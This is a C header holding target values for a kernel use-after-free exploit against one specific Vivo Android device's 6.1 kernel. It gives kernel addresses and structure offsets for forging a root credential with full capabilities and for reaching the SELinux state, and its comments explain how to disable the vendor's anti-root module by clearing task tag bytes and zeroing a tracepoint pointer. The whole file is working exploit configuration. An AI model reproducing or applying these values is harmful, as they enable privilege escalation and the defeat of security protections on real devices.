#ifndef TARGET_H
#define TARGET_H

/*
 * CVE-2026-98260 (posix cpu timers UAF) exploit target values
 * Kernel: 6.1.145-android14-11-maybe-dirty (Vivo V2352GA / PD2352)
 * Device: vivo/PD2352M/PD2352, OriginOS 6, slot _b
 * Image: extracted/kernel-slot-b.img SHA256 1d3a0ba30083b6c6ae22491a83715c0ba2d114fa2845bf91c528f4692b09a5f5
 * Base: 0xffffffc008000000 (link-time, KASLR slide = 0)
 *
 * Derived from device Image + vmlinux.btf + runtime (BTF-verified, Image-disasm-verified):
 * - task_struct.cred 2104 (0x838), real_cred 2096, BTF size 0x1500
 * - cred.size 0xB0 (176), uid 4, caps 40/48/56, security 120, user 128, user_ns 136, ucounts 144, groups 152
 * - tracepoint.funcs 64 (0x40), k_itimer.size 0x108, it.cpu at 0x78
 * - do_timer_create+0xa4 bl kmem_cache_alloc (posix_timers_cache 0xa447ee0)
 * - dup_task_struct+0x54 bl kmem_cache_alloc_node (task_struct_cachep 0xa41f638)
 * - selinux_state 0xa5586a8 (enforcing 0, initialized 2), panic_on_warn 0xa1cae08
 * - __tracepoint_sys_exit 0xa3cb2c0 (name "sys_exit", funcs 0x40)
 * - init_task 0xa1dfc00, init_cred 0xa1f24f0, root_user 0xa1f11c8, init_user_ns 0xa1f0f30, etc.
 *
 * STATIC_TIMER_SITE / DUP_SITE are kmem_cache_* call-site addresses (ftrace call_site / _RET_IP_).
 * Add g_slide at runtime.
 */

#define STATIC_TIMER_SITE   0xffffffc0081a2c34ULL
#define TIMER_SITE_LOW21    0x1a2c34ULL
#define TIMER_ALLOC         0x108ULL

/* cred_jar: BTF sizeof=0xB0 (176) but runtime kmem trace req=0xB8 (184, diag-cred cnt=3), slab alloc=0xC0 */
#define CRED_REQ            0xb8ULL
#define CRED_ALLOC          0xc0ULL

/* Link-time addresses (Image + BTF) and BTF field offsets */
#define SELINUX_STATE_STATIC  0xffffffc00a5586a8ULL
#define PANIC_ON_WARN_STATIC  0xffffffc00a1cae08ULL
#define CRED_UID_OFF          0x4ULL

/* task_struct / cred layout (BTF) */
#define OFF_TASK_CRED       0x838ULL
/* task alloc via dup_task_struct+0x58 ret (bl at +0x54) (kmem_cache_alloc_node), not copy_process+0x140 */
#define COPY_PROCESS_LOW21  0xae0b0ULL
#define TASK_ALLOC_BYTES    0x1500ULL
#define FULLCAP             0x1ffffffffffULL

/* Link-time symbols for the fake cred's refcounted sub-objects (slide 0) */
#define ROOT_USER_STATIC    0xffffffc00a1f11c8ULL
#define INIT_USER_NS_STATIC 0xffffffc00a1f0f30ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00a1f2a78ULL
#define INIT_GROUPS_STATIC  0xffffffc00a1f24e8ULL
#define SELINUX_BLOB_OFF    0x0ULL
#define SELINUX_SID_KERNEL  1U

/* vivo vr.ko anti-root per-task tag.
 * vr.ko tags every shell/app-origin task (commit_creds probe) with marker
 * bytes inside thread_info (flags byte 6 and padding byte 44 = 0x2c).
 * Offsets from vr.ko disasm + BTF thread_info (size 48):
 * thread_info.flags 0x00 (8), scs_sp 0x20 (8), cpu 0x28, padding 0x2c.
 * Clearing flags word (0x00, 8 bytes) removes 0x400 work bit + tagA,
 * clearing 0x28 slot (8 bytes) removes tagB (0x2c) while staying inside
 * thread_info (0x00-0x2f), so __state at 0x30 untouched.
 * VERIFIED on V2352GA BTF: thread_info 48 bytes, task+0x00/+0x28 safe.
 */
#define VR_TAG_A_OFF        0x06ULL
#define VR_TAG_B_OFF        0x2cULL

/* vivo vr.ko global kill-path disable: zero the funcs pointer of
 * __tracepoint_sys_exit (0xa3cb2c0), whose iterator NULL-checks funcs
 * (cbz in disasm at 0x14c5c/0x14cc4 etc.). Verified TP struct at file
 * 0x23cb2c0 has name "sys_exit" (0x9720a24) and funcs NULL currently.
 * Struct tracepoint.funcs is at offset 64 (0x40) on 6.1 BTF (vs 0x48 on 6.6+).
 * Clearing funcs disables vr's sys_exit termination probe for ALL tasks,
 * including KernelSU/SukiSU helper tasks spawned later. Precise: only
 * this one 8-byte write, no hooks, no callbacks.
 */
#define TP_SYS_EXIT_STATIC   0xffffffc00a3cb2c0ULL
#define TRACEPOINT_FUNCS_OFF 0x40ULL

#endif /* TARGET_H */
